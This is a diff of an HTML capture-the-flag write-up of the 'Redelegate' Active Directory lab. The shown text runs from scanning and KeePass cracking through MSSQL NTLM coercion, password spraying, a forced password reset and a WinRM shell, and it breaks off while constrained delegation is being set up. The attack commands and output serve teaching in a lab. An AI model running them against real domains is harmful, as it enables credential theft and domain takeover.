@@ -750,7 +750,7 @@
 
 
 <p><img alt="Redelegate Banner" src="../img/Redelegate_BANNER.png" /></p>
-<h1 id="redelegate-writeup">Redelegate — WriteUp<a class="headerlink" href="#redelegate-writeup" title="Permanent link">&para;</a></h1>
+<h1 id="redelegate-writeup">Redelegate — WriteUp</h1>
 <p>In this Windows Active Directory machine rated <strong>Hard</strong>, we compromise a Domain Controller by chaining several misconfigurations. Starting from anonymous FTP access, we extract a KeePass database, crack its master password, find domain credentials, and abuse a <code>ForceChangePassword</code> privilege to pivot users. From there, we leverage <code>SeEnableDelegationPrivilege</code> to configure <strong>Resource-Based Constrained Delegation (RBCD)</strong> on an existing machine account, ultimately performing an S4U2Proxy attack to impersonate the Domain Controller itself and dump the Administrator hash. You will learn how to:</p>
 <ul>
 <li>Enumerate open services on a Windows Domain Controller with <code>nmap</code></li>
@@ -768,7 +768,7 @@
 <p>🧰 Tools used: <code>nmap</code>, <code>ftp</code>, <code>keepass2john</code>, <code>john</code>, <code>keepassxc-cli</code>, <code>netexec</code>, <code>bloodyAD</code>, <code>evil-winrm</code>, <code>getTGT.py</code>, <code>getST.py</code>, <code>secretsdump.py</code>.</p>
 <p>Let's get started.</p>
 <hr />
-<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
+<h2 id="port-scanning">Port Scanning</h2>
 <p>We start with a full TCP SYN scan across all 65535 ports. Using <code>-Pn</code> skips host discovery (ICMP is often blocked), <code>-sS</code> sends raw SYN packets (faster and stealthier than a full connect), and <code>-n</code> disables DNS resolution to avoid delays.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>❯<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span><span class="m">10</span>.129.234.50
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
@@ -806,7 +806,7 @@
 </code></pre></div>
 <p>The port profile is unmistakably a <strong>Windows Domain Controller</strong>: Kerberos (88), LDAP (389/636), Global Catalog (3268/3269), RDP (3389), WinRM (5985), ADWS (9389), and notably <strong>FTP (21)</strong> and <strong>MSSQL (1433)</strong> — both less common on DCs and worth investigating immediately.</p>
 <hr />
-<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="service-enumeration">Service Enumeration</h3>
 <p>With the open ports identified, we run a targeted scan with <code>-sV</code> (version detection) and <code>-sC</code> (default scripts) to fingerprint services and grab banners.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>❯<span class="w"> </span>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49669,49932,55051,62931,62940,62941,62942,62948<span class="w"> </span><span class="m">10</span>.129.234.50
 <a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
@@ -928,11 +928,11 @@
 - <strong>MSSQL</strong> is running on a DC, which is unusual and suggests a service account may be configured there.</p>
 <p>The domain is <code>redelegate.vl</code> and the machine is <code>dc.redelegate.vl</code>.</p>
 <hr />
-<h3 id="etchosts">/etc/hosts<a class="headerlink" href="#etchosts" title="Permanent link">&para;</a></h3>
+<h3 id="etchosts">/etc/hosts</h3>
 <p>We add both the domain and the DC hostname to <code>/etc/hosts</code> so tools that rely on DNS resolution (Kerberos, SMB, WinRM) work correctly.</p>
 <p><code>redelegate.vl</code> <code>dc.redelegate.vl</code> &gt; <code>/etc/hosts</code></p>
 <hr />
-<h2 id="anonymous-ftp-extracting-sensitive-files">Anonymous FTP — Extracting Sensitive Files<a class="headerlink" href="#anonymous-ftp-extracting-sensitive-files" title="Permanent link">&para;</a></h2>
+<h2 id="anonymous-ftp-extracting-sensitive-files">Anonymous FTP — Extracting Sensitive Files</h2>
 <p>FTP allows anonymous authentication, which means no credentials are needed. We connect, switch to binary mode to avoid file corruption on non-text files (critical for <code>.kdbx</code>), disable the interactive prompt, and grab everything at once.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>❯<span class="w"> </span>ftp<span class="w"> </span>anonymous@10.129.234.50
 <a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.129.234.50.
@@ -1033,7 +1033,7 @@
 </code></pre></div>
 This is a small but highly targeted wordlist — 19 entries. That's intentional: the training document handed us the exact pattern, so a broad wordlist would just be noise.</p>
 <hr />
-<h3 id="extracting-the-hash-and-cracking-with-hashcat">Extracting the Hash and cracking with Hashcat<a class="headerlink" href="#extracting-the-hash-and-cracking-with-hashcat" title="Permanent link">&para;</a></h3>
+<h3 id="extracting-the-hash-and-cracking-with-hashcat">Extracting the Hash and cracking with Hashcat</h3>
 <p><code>keepass2john</code> reads the <code>.kdbx</code> file and outputs a hash that represents the KDF (Key Derivation Function) parameters plus the encrypted database blob. This hash is what we crack offline at no point does the database itself need to be "open".
 We use mode <code>-m 13400</code> (KeePass KDBX v2/v3) and feed it our custom wordlist:</p>
 <h2 id="keepass2john-sharedkdbx-hash_to_cracktxt-hashcat-m-13400-hash_to_cracktxt-passwordstxt-hashcat-v712-starting-keepass26000000ce7395f413946b0cd27950redacted_hashredacted_passwd-snip"><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>❯<span class="w"> </span>keepass2john<span class="w"> </span>Shared.kdbx<span class="w"> </span>&gt;<span class="w"> </span>hash_to_crack.txt
@@ -1043,8 +1043,8 @@ We use mode <code>-m 13400</code> (KeePass KDBX v2/v3) and feed it our custom wo
 <a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nv">$keepass$*</span><span class="m">2</span>*600000*0*ce7395f413946b0cd27950&lt;REDACTED_HASH&gt;:&lt;REDACTED_PASSWD&gt;
 <a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
 <a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>&lt;SNIP&gt;
-</code></pre></div><a class="headerlink" href="#keepass2john-sharedkdbx-hash_to_cracktxt-hashcat-m-13400-hash_to_cracktxt-passwordstxt-hashcat-v712-starting-keepass26000000ce7395f413946b0cd27950redacted_hashredacted_passwd-snip" title="Permanent link">&para;</a></h2>
-<h3 id="dumping-the-database-contents">Dumping the Database Contents<a class="headerlink" href="#dumping-the-database-contents" title="Permanent link">&para;</a></h3>
+</code></pre></div></h2>
+<h3 id="dumping-the-database-contents">Dumping the Database Contents</h3>
 <p>Before dumping everything, we first list the top-level groups to understand what's inside. This mirrors what a real attacker would do enumerate before extracting:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>❯<span class="w"> </span>keepassxc-cli<span class="w"> </span>ls<span class="w"> </span>Shared.kdbx
 <a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Enter<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>unlock<span class="w"> </span>Shared.kdbx:
@@ -1082,7 +1082,7 @@ We use mode <code>-m 13400</code> (KeePass KDBX v2/v3) and feed it our custom wo
 <a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="s2">"Shared/Finance"</span>,<span class="s2">"Payrol App"</span>,<span class="s2">"Payroll"</span>,<span class="s2">"&lt;REDACTED_PASSWD&gt;"</span>,<span class="s2">""</span>,<span class="s2">""</span>,<span class="s2">""</span>,<span class="s2">"0"</span>,<span class="s2">"2024-10-20T12:14:11Z"</span>,<span class="s2">"2024-10-20T12:13:50Z"</span>
 </code></pre></div>
 <hr />
-<h2 id="mssql-enumeration-accessing-the-database">MSSQL Enumeration — Accessing the Database<a class="headerlink" href="#mssql-enumeration-accessing-the-database" title="Permanent link">&para;</a></h2>
+<h2 id="mssql-enumeration-accessing-the-database">MSSQL Enumeration — Accessing the Database</h2>
 <p>We now have valid SQL credentials from the KeePass dump: <code>SQLGuest:&lt;REDACTED_PASSWD&gt;</code>. Before diving into the database, we confirm the login actually works against the target. Using <code>--local-auth</code> tells <code>netexec</code> to authenticate against the local SQL instance rather than the domain, since this is a SQL Server account, not a Windows domain account.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>❯<span class="w"> </span>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.129.234.50<span class="w"> </span>-u<span class="w"> </span><span class="s1">'SQLGuest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED_PASSWD&gt;'</span><span class="w"> </span>--local-auth
 <a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:redelegate.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>EncryptionReq:False<span class="o">)</span>
@@ -1090,7 +1090,7 @@ We use mode <code>-m 13400</code> (KeePass KDBX v2/v3) and feed it our custom wo
 </code></pre></div>
 Authentication succeeds. We now have an interactive SQL session to explore.</p>
 <hr />
-<h3 id="exploring-the-database">Exploring the Database<a class="headerlink" href="#exploring-the-database" title="Permanent link">&para;</a></h3>
+<h3 id="exploring-the-database">Exploring the Database</h3>
 <p><code>mssqlclient.py</code> from Impacket gives us an interactive SQL shell. We connect using the <code>DC\</code> prefix since this is a local SQL account on the <code>DC</code> instance:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>❯<span class="w"> </span>mssqlclient.py<span class="w"> </span>DC/SQLGuest:&lt;REDACTED_PASSWD&gt;@10.129.234.50
 <a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1116,7 +1116,7 @@ Authentication succeeds. We now have an interactive SQL session to explore.</p>
 </code></pre></div>
 Only the four default system databases are visible to this guest account — no custom application databases. This user has very limited read permissions, so the value here isn't in the database contents but in what we can do through the SQL engine itself.</p>
 <hr />
-<h3 id="checking-for-linked-servers">Checking for Linked Servers<a class="headerlink" href="#checking-for-linked-servers" title="Permanent link">&para;</a></h3>
+<h3 id="checking-for-linked-servers">Checking for Linked Servers</h3>
 <p>Linked servers are a SQL Server feature that allows one instance to execute queries against another remote SQL Server. If a linked server exists and runs under a privileged account, it can be abused to pivot or elevate privileges. We check with <code>sp_linkedservers</code>:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>SQL<span class="w"> </span><span class="o">(</span>SQLGuest<span class="w">  </span>guest@msdb<span class="o">)</span>&gt;<span class="w"> </span>EXEC<span class="w"> </span>sp_linkedservers<span class="p">;</span>
 <a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>SRV_NAME<span class="w">                     </span>SRV_PROVIDERNAME<span class="w">   </span>SRV_PRODUCT<span class="w">   </span>SRV_DATASOURCE<span class="w">               </span>SRV_PROVIDERSTRING<span class="w">   </span>SRV_LOCATION<span class="w">   </span>SRV_CAT
@@ -1125,7 +1125,7 @@ Only the four default system databases are visible to this guest account — no 
 </code></pre></div>
 The only linked server is the instance itself. No lateral movement available here. Dead end on that front.</p>
 <hr />
-<h3 id="forcing-ntlm-authentication-capturing-the-sql_svc-hash">Forcing NTLM Authentication — Capturing the sql_svc Hash<a class="headerlink" href="#forcing-ntlm-authentication-capturing-the-sql_svc-hash" title="Permanent link">&para;</a></h3>
+<h3 id="forcing-ntlm-authentication-capturing-the-sql_svc-hash">Forcing NTLM Authentication — Capturing the sql_svc Hash</h3>
 <p>Even without <code>xp_cmdshell</code>, SQL Server can be forced to make outbound network requests. <code>xp_dirtree</code> is a stored procedure that lists directory contents from a UNC path — and if we point it to our own machine, SQL Server will attempt to authenticate via NTLM, leaking the hash of the service account running the SQL process.</p>
 <p>We first start <code>Responder</code> on our interface (<code>tun0</code> in this case) to intercept incoming NTLM authentication attempts.
 Then from our SQL session, we trigger the outbound connection.
@@ -1144,7 +1144,7 @@ Then from our SQL session, we trigger the outbound connection.
 </code></pre></div>
 We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> — the service account running SQL Server. However, after attempting to crack it offline against <code>rockyou.txt</code>, the hash does not crack. This is a dead end for direct credential reuse, but it confirms the service account identity. We pivot to a different approach for user enumeration.</p>
 <hr />
-<h2 id="ad-user-enumeration-via-mssql-rid-cycling">AD User Enumeration via MSSQL — RID Cycling<a class="headerlink" href="#ad-user-enumeration-via-mssql-rid-cycling" title="Permanent link">&para;</a></h2>
+<h2 id="ad-user-enumeration-via-mssql-rid-cycling">AD User Enumeration via MSSQL — RID Cycling</h2>
 <p>Even as a guest, SQL Server lets us resolve Security Identifiers (SIDs) to names using built-in functions like <code>SUSER_SNAME()</code>. Every domain object (user, group, computer) has a SID composed of a fixed domain portion plus a variable RID (Relative Identifier). By iterating RIDs from 500 to ~2000, we can enumerate all domain principals without needing LDAP access.</p>
 <p>We first manually probe a few RIDs to confirm the technique works and to identify the domain SID base:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>SQL<span class="w"> </span><span class="o">(</span>SQLGuest<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span>SELECT<span class="w"> </span>SUSER_SNAME<span class="o">(</span>0x0105000000000005150000001d9a3e416536d3b0c05fc3ef51040000<span class="o">)</span><span class="p">;</span>
@@ -1258,7 +1258,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 </code></pre></div>
 <p>We get a complete picture of the domain: users, groups, and computer accounts including <code>FS01$</code>, which will become relevant later.</p>
 <p>Note that RID 500 resolves to <code>WIN-Q13O908QBPG\Administrator</code> — a local account from the machine's previous hostname before it was promoted to a DC. This is a leftover artifact, not a domain admin account.</p>
-<h3 id="alternative-netexec-rid-brute">Alternative: netexec --rid-brute<a class="headerlink" href="#alternative-netexec-rid-brute" title="Permanent link">&para;</a></h3>
+<h3 id="alternative-netexec-rid-brute">Alternative: netexec --rid-brute</h3>
 <p><code>netexec</code> can do the same thing in one line, producing cleaner output without writing any custom code. Both approaches yield identical results — the Python script is useful when you need more control or want to integrate results into a pipeline:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>❯<span class="w"> </span>nxc<span class="w"> </span>mssql<span class="w"> </span><span class="m">10</span>.129.234.50<span class="w"> </span>-u<span class="w"> </span><span class="s1">'SQLGuest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED_PASSWD&gt;'</span><span class="w"> </span>--rid-brute<span class="w"> </span>--local-auth
 <a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:redelegate.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>EncryptionReq:False<span class="o">)</span>
@@ -1302,7 +1302,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="m">1119</span>:<span class="w"> </span>REDELEGATE<span class="se">\s</span>ql_svc
 </code></pre></div></p>
 <hr />
-<h2 id="credential-spraying-getting-a-foothold">Credential Spraying — Getting a Foothold<a class="headerlink" href="#credential-spraying-getting-a-foothold" title="Permanent link">&para;</a></h2>
+<h2 id="credential-spraying-getting-a-foothold">Credential Spraying — Getting a Foothold</h2>
 <p>With a full user list and the password <code>&lt;REDACTED_PASSWD&gt;</code> recovered from the KeePass database, we build our wordlists. We populate <code>users.txt</code> with all domain users (excluding machine accounts and built-in system accounts), and <code>passwords.txt</code> with <code>&lt;REDACTED_PASSWD&gt;</code> as our sole candidate — since the KeePass audit confirmed it was a shared password and the audit noted the rotation was already "DONE."
 <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>❯<span class="w"> </span>vim<span class="w"> </span>users.txt
 <a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>❯<span class="w"> </span>vim<span class="w"> </span>passwords.txt
@@ -1329,7 +1329,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>redelegate.vl<span class="se">\M</span>arie.Curie:&lt;REDACTED_PASSWD&gt;
 </code></pre></div></p>
 <hr />
-<h2 id="bloodhound-enumeration-mapping-the-attack-path">BloodHound Enumeration — Mapping the Attack Path<a class="headerlink" href="#bloodhound-enumeration-mapping-the-attack-path" title="Permanent link">&para;</a></h2>
+<h2 id="bloodhound-enumeration-mapping-the-attack-path">BloodHound Enumeration — Mapping the Attack Path</h2>
 <p>With valid domain credentials, we run BloodHound collection to graph all AD relationships, ACLs, group memberships, and delegation configurations. This gives us a visual attack map we can query with pre-built or custom Cypher queries.</p>
 <p><img alt="BloodHound — Marie.Curie ForceChangePassword over HELPDESK members" src="../img/Redelegate_0001.png" />
 <img alt="BloodHound — Helen.Frost member of Remote Management Users" src="../img/Redelegate_0002.png" /></p>
@@ -1341,13 +1341,13 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 </ul>
 <p>The path is: reset <code>Helen.Frost</code>'s password via <code>ForceChangePassword</code> → WinRM in as her.</p>
 <hr />
-<h2 id="abusing-forcechangepassword-pivoting-to-helenfrost">Abusing ForceChangePassword — Pivoting to Helen.Frost<a class="headerlink" href="#abusing-forcechangepassword-pivoting-to-helenfrost" title="Permanent link">&para;</a></h2>
+<h2 id="abusing-forcechangepassword-pivoting-to-helenfrost">Abusing ForceChangePassword — Pivoting to Helen.Frost</h2>
 <p><code>ForceChangePassword</code> is an AD extended right that allows resetting another user's password <strong>without knowing their current one</strong>. It operates at the LDAP level, so no local access to the target machine is needed. <code>bloodyAD</code> performs this operation using standard authenticated LDAP over port 389:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>❯<span class="w"> </span>bloodyAD<span class="w"> </span>-d<span class="w"> </span>redelegate.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Marie.Curie'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED_PASSWD&gt;'</span><span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.234.50<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span><span class="s1">'Helen.Frost'</span><span class="w"> </span><span class="s1">'Pass1234!@#$'</span>
 <a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>changed<span class="w"> </span>successfully!
 </code></pre></div></p>
 <hr />
-<h3 id="verifying-winrm-access-and-getting-a-shell">Verifying WinRM Access and Getting a Shell<a class="headerlink" href="#verifying-winrm-access-and-getting-a-shell" title="Permanent link">&para;</a></h3>
+<h3 id="verifying-winrm-access-and-getting-a-shell">Verifying WinRM Access and Getting a Shell</h3>
 <p>We confirm the new credentials work over WinRM before opening an interactive shell. The <code>(Pwn3d!)</code> tag in <code>netexec</code> output means the account has WinRM access — it maps to membership in <strong>Remote Management Users</strong>, which we already confirmed via BloodHound:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>❯<span class="w"> </span>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.129.234.50<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Helen.Frost'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Pass1234!@#$'</span>
 <a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:redelegate.vl<span class="o">)</span>
@@ -1367,8 +1367,8 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="p">&lt;</span><span class="n">USER_FLAG</span><span class="p">&gt;</span>
 </code></pre></div>
 <hr />
-<h2 id="privilege-escalation-constrained-delegation-via-seenabledelegationprivilege">Privilege Escalation — Constrained Delegation via SeEnableDelegationPrivilege<a class="headerlink" href="#privilege-escalation-constrained-delegation-via-seenabledelegationprivilege" title="Permanent link">&para;</a></h2>
-<h3 id="checking-token-privileges">Checking Token Privileges<a class="headerlink" href="#checking-token-privileges" title="Permanent link">&para;</a></h3>
+<h2 id="privilege-escalation-constrained-delegation-via-seenabledelegationprivilege">Privilege Escalation — Constrained Delegation via SeEnableDelegationPrivilege</h2>
+<h3 id="checking-token-privileges">Checking Token Privileges</h3>
 <p>The first command on any new shell is <code>whoami /priv</code>. This lists every privilege currently assigned to the user's token — many Windows privileges that look innocuous can be abused for escalation:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Helen</span><span class="p">.</span><span class="n">Frost</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
 <a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
@@ -1383,7 +1383,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span>                                <span class="n">Enabled</span>
 </code></pre></div></p>
 <p><strong><code>SeEnableDelegationPrivilege</code></strong> stands out. By default, only Domain Admins can configure the delegation attributes (<code>msDS-AllowedToDelegateTo</code> and <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>) on AD objects. This privilege extends that ability to our user — meaning we can configure Constrained Delegation on any account we already have write access to.</p>
-<h3 id="checking-machine-account-quota">Checking Machine Account Quota<a class="headerlink" href="#checking-machine-account-quota" title="Permanent link">&para;</a></h3>
+<h3 id="checking-machine-account-quota">Checking Machine Account Quota</h3>
 <p>Before deciding on an attack path, we check <code>MachineAccountQuota</code> (MAQ) — the number of machine accounts a regular user is allowed to create in the domain. If MAQ &gt; 0, we could create a fresh machine account and configure delegation on it. If it's 0, we need to find an existing machine account we can control:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>❯<span class="w"> </span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.129.234.50<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Helen.Frost'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Pass1234!@#$'</span><span class="w"> </span>-M<span class="w"> </span>maq
 <a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">389</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:redelegate.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:None<span class="o">)</span><span class="w"> </span><span class="o">(</span>channel<span class="w"> </span>binding:No<span class="w"> </span>TLS<span class="w"> </span>cert<span class="o">)</span>
@@ -1392,7 +1392,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>MAQ<span class="w">         </span><span class="m">10</span>.129.234.50<span class="w">   </span><span class="m">389</span><span class="w">    </span>DC<span class="w">               </span>MachineAccountQuota:<span class="w"> </span><span class="m">0</span>
 </code></pre></div></p>
 <hr />
-<h3 id="bloodhound-finding-a-controllable-machine-account">BloodHound — Finding a Controllable Machine Account<a class="headerlink" href="#bloodhound-finding-a-controllable-machine-account" title="Permanent link">&para;</a></h3>
+<h3 id="bloodhound-finding-a-controllable-machine-account">BloodHound — Finding a Controllable Machine Account</h3>
 <p><img alt="BloodHound — Helen.Frost → IT group → GenericAll over FS01$" src="../img/Redelegate_0003.png" />
 <img alt="BloodHound — IT group members: Helen.Frost, Mallory.Roberts, Ryan.Cooper" src="../img/Redelegate_0004.png" />
 <img alt="BloodHound — Ryan.Cooper → Domain Admins → Administrator" src="../img/Redelegate_0005.png" /></p>
@@ -1406,8 +1406,8 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <p>The attack plan: configure <code>FS01$</code> with Constrained Delegation targeting <code>cifs/dc.redelegate.vl</code>, then perform S4U2Proxy to obtain a service ticket impersonating the DC machine account, and finally run DCSync.</p>
 <p>Image 5 also shows a secondary path through <code>Ryan.Cooper</code> — he's also in <strong>IT</strong>, and is a member of <strong>Domain Admins</strong>. We could potentially reset his password the same way we did with <code>Helen.Frost</code> and get direct DA access. But we'll follow the delegation path as it's the intended route and teaches the more interesting technique.</p>
 <hr />
-<h2 id="configuring-constrained-delegation-on-fs01">Configuring Constrained Delegation on FS01$<a class="headerlink" href="#configuring-constrained-delegation-on-fs01" title="Permanent link">&para;</a></h2>
-<h3 id="step-1-get-a-tgt-for-helenfrost">Step 1 — Get a TGT for Helen.Frost<a class="headerlink" href="#step-1-get-a-tgt-for-helenfrost" title="Permanent link">&para;</a></h3>
+<h2 id="configuring-constrained-delegation-on-fs01">Configuring Constrained Delegation on FS01$</h2>
+<h3 id="step-1-get-a-tgt-for-helenfrost">Step 1 — Get a TGT for Helen.Frost</h3>
 <p>Kerberos operations require a valid TGT cached locally. <code>getTGT.py</code> requests one from the DC and saves it to a <code>.ccache</code> file. We then export <code>KRB5CCNAME</code> so every subsequent Kerberos-aware tool knows where to find it:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>❯<span class="w"> </span>getTGT.py<span class="w"> </span>redelegate.vl/Helen.Frost:<span class="s1">'Pass1234!@#$'</span>
 <a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1416,23 +1416,23 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 </code></pre></div></p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>❯<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Helen.Frost.ccache
 </code></pre></div>
-<h3 id="step-2-reset-fs01s-password">Step 2 — Reset FS01$'s Password<a class="headerlink" href="#step-2-reset-fs01s-password" title="Permanent link">&para;</a></h3>
